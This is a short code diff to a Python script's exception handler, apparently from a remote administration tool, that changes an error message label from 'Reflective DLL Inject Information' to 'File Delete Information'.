@@ -813,7 +813,7 @@ Open Ports
 
                     except Exception as Error:
                         print("[X] Error : " + str(Error))
-                        print("[i] Reflective DLL Inject Information : " + client_data)
+                        print("[i] File Delete Information : " + client_data)
                         # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                         print("[i] Please report this bug to developer with the information above.")
                         pass
